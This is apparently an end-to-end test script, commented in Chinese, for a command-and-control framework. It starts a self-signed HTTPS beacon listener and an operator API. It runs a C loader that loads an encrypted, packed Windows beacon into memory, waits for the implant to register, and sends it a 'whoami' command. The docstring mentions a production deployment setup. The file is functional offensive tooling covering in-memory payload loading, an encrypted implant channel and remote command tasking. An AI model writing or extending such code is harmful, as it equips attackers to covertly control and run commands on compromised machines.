"""C2 TLS E2E：自签 HTTPS 服务端 + WinHTTP beacon（--scheme https --tls-verify 0）全链。

生产路径（nginx TLS 终结 + Let's Encrypt + --tls-verify 1）见 c2/deploy/。
跑法：先 build_beacon.py --scheme https --tls-verify 0 --out beacon_tls.exe 并打包，
再 python e2e_tls.py。
"""

from __future__ import annotations

import json
import ssl
import subprocess
import sys
import threading
import time
import urllib.request
from http.server import ThreadingHTTPServer
from pathlib import Path

HERE = Path(__file__).resolve().parent
WARROOM = HERE.parent.parent
SERVER_DIR = HERE.parent / "server"
sys.path.insert(0, str(WARROOM))   # camty 包（traffic.CertFactory）
sys.path.insert(0, str(SERVER_DIR))

import camty_c2  # noqa: E402
import protocol  # noqa: E402

PSK = "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"
TOKEN = "tls" + "0" * 29
API_PORT = 8895
TLS_PORT = 8443


def api(path: str, method: str = "GET", body: dict | None = None) -> dict:
    req = urllib.request.Request(
        f"http://127.0.0.1:{API_PORT}{path}", method=method,
        data=json.dumps(body).encode() if body else None,
        headers={"Authorization": f"Bearer {TOKEN}",
                 "Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode())


def main() -> None:
    from camty.traffic import CertFactory

    # 1) 自签证书（Camty CA 体系复用）+ TLS 包装 beacon 端口
    certs = CertFactory(Path(tempfile.mkdtemp(prefix="c2tls-")) / "ca")
    leaf = certs.leaf_path("127.0.0.1")
    store = camty_c2.Store(None)
    beacon_srv = ThreadingHTTPServer(("127.0.0.1", TLS_PORT), camty_c2.BeaconHandler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(leaf)
    beacon_srv.socket = ctx.wrap_socket(beacon_srv.socket, server_side=True)
    beacon_srv.psk = protocol.gen_psk()  # 会被下方覆盖为 PSK 常量
    psk = bytes.fromhex(PSK)
    beacon_srv.psk = psk
    beacon_srv.store = store
    beacon_srv.beacon_path = "/beacon"
    beacon_srv.result_path = "/result"
    beacon_srv.beacon_ctype = "application/json"
    threading.Thread(target=beacon_srv.serve_forever, daemon=True).start()

    api_srv = ThreadingHTTPServer(("127.0.0.1", API_PORT), camty_c2.ApiHandler)
    api_srv.psk = psk
    api_srv.token = TOKEN
    api_srv.store = store
    threading.Thread(target=api_srv.serve_forever, daemon=True).start()

    # 2) 加密打包的 TLS beacon 经 C loader 内存加载
    blob_path = HERE / "beacon_tls.b64"
    assert blob_path.exists(), "先构建打包 beacon_tls.exe（见文件头注释）"
    loader = subprocess.Popen(
        [str(HERE / "loader.exe"), str(blob_path), "camty"],
        cwd=str(HERE), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    session_id = None
    for _ in range(60):
        time.sleep(1.0)
        sessions = store.sessions_list()
        if sessions:
            session_id = sessions[0]["id"]
            break
    assert session_id, "TLS beacon 未注册 session"
    print(f"[TLS E2E] session 注册成功: {session_id}")

    task_id = store.queue(session_id, "cmd", {"command": "whoami"})
    output = None
    for _ in range(40):
        time.sleep(1.0)
        task = store.get_task(task_id)
        if task and task.get("status") == "done":
            output = task.get("output", "")
            break
    print(f"[TLS E2E] whoami 输出: {output!r}")
    assert output, "任务无输出"
    loader.kill()
    print("[TLS E2E] PASS：HTTPS(schannel) 加密信道全链")


if __name__ == "__main__":
    import tempfile

    main()
